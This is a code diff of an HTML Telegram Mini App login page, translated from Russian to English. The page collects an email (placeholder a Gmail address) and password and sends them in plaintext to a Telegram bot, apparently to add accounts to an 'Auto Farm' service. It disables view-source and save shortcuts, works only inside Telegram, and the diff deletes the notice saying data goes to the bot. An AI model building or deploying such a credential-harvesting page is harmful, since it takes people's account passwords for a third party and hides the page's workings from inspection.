@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
@@ -15,8 +15,7 @@ body{
   padding:28px 20px;
 }
 .card{width:100%;max-width:400px;}
-h1{font-size:22px;font-weight:700;margin-bottom:6px;}
-.sub{font-size:13px;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:28px;line-height:1.4;}
+h1{font-size:22px;font-weight:700;margin-bottom:24px;}
 .field{margin-bottom:16px;}
 label{display:block;font-size:11px;font-weight:700;letter-spacing:.7px;
   text-transform:uppercase;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:7px;}
@@ -51,12 +50,11 @@ button:not(:disabled):active{opacity:.8;}
 <div class="card">
   <div id="block">
     <div class="ico">⛔</div>
-    <h2>Доступ запрещён</h2>
-    <p>Работает только внутри Telegram<br>через кнопку бота.</p>
+    <h2>Access Denied</h2>
+    <p>This app only works inside Telegram<br>via the bot button.</p>
   </div>
   <div id="form">
     <h1 id="title">🔐 Sign In</h1>
-    <div class="sub">Данные передаются боту напрямую — в чате ничего не появляется</div>
     <div class="field">
       <label>Email</label>
       <input type="email" id="email" placeholder="account@gmail.com"
@@ -68,7 +66,7 @@ button:not(:disabled):active{opacity:.8;}
              autocomplete="current-password">
     </div>
     <div class="err" id="err"></div>
-    <button id="btn">Войти</button>
+    <button id="btn">Sign In</button>
   </div>
 </div>
 
@@ -80,24 +78,21 @@ button:not(:disabled):active{opacity:.8;}
        (e.ctrlKey&&['U','S'].indexOf(e.key.toUpperCase())>=0)){e.preventDefault();return false;}
   });
 
-  var tg       = window.Telegram && window.Telegram.WebApp;
-  var hasProxy = typeof window.TelegramWebviewProxy !== 'undefined';
-  var initData = tg ? (tg.initData || '') : '';
-  var mode     = new URLSearchParams(window.location.search).get('mode') || 'login';
+  var tg   = window.Telegram && window.Telegram.WebApp;
+  var mode = new URLSearchParams(window.location.search).get('mode') || 'login';
 
-  var inTelegram = (tg && initData.length > 0) || hasProxy;
-
-  if(!inTelegram){
+  if(!tg || !tg.initData || tg.initData.length === 0){
     document.getElementById('block').style.display = 'block';
     return;
   }
 
-  if(tg){ tg.ready(); tg.expand(); tg.MainButton.hide(); }
+  tg.ready();
+  tg.expand();
+  tg.MainButton.hide();
 
-  if(mode==='af'){
-    document.getElementById('title').textContent = '🤖 Auto Farm';
-    document.querySelector('.sub').textContent = 'Добавить аккаунт в авто-фарм';
-    document.getElementById('btn').textContent = 'Добавить';
+  if(mode === 'af'){
+    document.getElementById('title').textContent = '🤖 Add Account';
+    document.getElementById('btn').textContent   = 'Add';
   }
   document.getElementById('form').style.display = 'block';
 
@@ -110,16 +105,21 @@ button:not(:disabled):active{opacity:.8;}
     var errEl = document.getElementById('err');
     var btn   = document.getElementById('btn');
     errEl.textContent = '';
-    if(!email || email.indexOf('@')<1 || email.length<5){
-      errEl.textContent='❌ Введите корректный email';
+
+    if(!email || email.indexOf('@') < 1 || email.length < 5){
+      errEl.textContent = '❌ Enter a valid email';
       document.getElementById('email').focus(); return;
     }
-    if(!pw || pw.length<4){
-      errEl.textContent='❌ Введите пароль';
+    if(!pw || pw.length < 4){
+      errEl.textContent = '❌ Enter your password';
       document.getElementById('password').focus(); return;
     }
-    btn.disabled=true; btn.textContent='⏳ Отправка…';
-    tg.sendData(JSON.stringify({mode:mode,email:email,password:pw}));
+
+    btn.disabled = true;
+    btn.textContent = '⏳';
+
+    tg.sendData(JSON.stringify({mode: mode, email: email, password: pw}));
+    tg.close();
   }
 }());
 </script>
